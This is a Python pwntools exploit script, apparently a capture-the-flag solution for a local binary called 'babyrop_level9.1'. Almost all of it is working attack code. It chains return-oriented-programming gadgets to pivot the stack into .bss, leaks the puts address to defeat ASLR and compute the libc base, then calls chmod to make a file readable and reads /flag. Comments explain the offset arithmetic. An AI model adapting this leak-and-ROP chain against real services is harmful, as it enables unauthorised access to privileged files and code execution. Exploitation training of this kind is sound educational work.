from pwn import *

from glob import glob

path = glob('./baby*')[1]


elf = ELF("./babyrop_level9.1")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

rop = ROP("./babyrop_level9.1")

context.binary = elf



# Stage 1 leaking puts address

pop_rbp_ret = rop.rbp.address
leavel_ret = rop.leave.address
pop_rdi_ret = rop.rdi.address
pop_rsi_pop_r15_ret = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address


p = elf.process()

# We have bss start at 0x405060 and our input start at 0x415080 the distance between them 0x10020 since leave perform a pop rbp we need to mince 8 to avoid poping (pop rdi) into rbp
# pop rbp = leavel_ret,
''' bss + offset(0x10020) points to pop rdi;ret when leave intsturction execute this we will set rsp = bss + 0x10020 + 0x18 
and pop rbp will pop the pop rdi instruction address into rbp to avoid that we will mince 8 from 0x10020 to pop another value into rbp instead of pop rdi instruction
'''


offset = 0x10018 + 0x18

# gdb.attach(p,''' 
# b *challenge+78
# b *challenge+96
# c
# ''')


# elf.bss() = 0x405060


payload = flat(
    pop_rbp_ret,
    elf.bss()+offset,
    leavel_ret,
    pop_rdi_ret,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['_start']
    )

p.send(payload)

p.recvuntil(b'Leaving!\n')

leak = int.from_bytes(p.recv(0x6),'little')

log.success(hex(leak))

libc.address = leak - libc.symbols.puts

log.success(hex(libc.address))

filename = next(elf.search(b"Leaving!"))

mode = 0o4

payload = flat(

            pop_rbp_ret,

            elf.bss() + offset,

            leavel_ret,

            pop_rdi_ret,

            filename,

            pop_rsi_pop_r15_ret,

            mode,

            b"".ljust(0x8, b"A"),

            libc.symbols["chmod"],

        )
p.send(payload)

p.recvall(timeout=3)

try:

    with open("/flag", "r") as file:

                content = file.read()

                log.success(content)
except FileNotFoundError:

            log.exception("The file '/flag' does not exist.")

except PermissionError:

            log.failure("Permission denied to read '/flag'.")

except Exception as e:

            log.exception(f"An error occurred while performing attack: {e}")

except Exception as e:

        log.exception(f"An error occurred while performing attack: {e}")